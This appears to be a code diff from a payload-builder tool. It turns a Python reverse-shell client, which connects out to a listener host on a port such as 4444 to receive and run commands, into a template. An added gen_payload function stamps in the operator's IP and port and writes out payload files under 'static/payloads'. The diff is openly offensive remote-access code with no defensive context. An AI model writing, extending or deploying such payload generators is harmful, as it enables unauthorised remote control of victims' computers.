@@ -1,3 +1,10 @@
+import sys
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8", 80))
+ip = s.getsockname()[0]
+string = """
 import os, subprocess, socket
 import ssl
 
@@ -9,8 +16,8 @@ def connect():
         global s
         global sock
 
-        host = '172.16.69.132'
-        port = 4444
+        host = "{host}"
+        port = {port}
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
         print("Trying to Connect")
@@ -42,3 +49,12 @@ def send(args):
 connect()
 receive()
 s.close()
+"""
+
+
+def gen_payload(id, port):
+    var = {'host': ip, 'port':port}
+    file_name = 'static/payloads/listener-%d.py' %id
+    f = open(file_name,'w')
+    f.write(string.format(**var))
+    f.close()
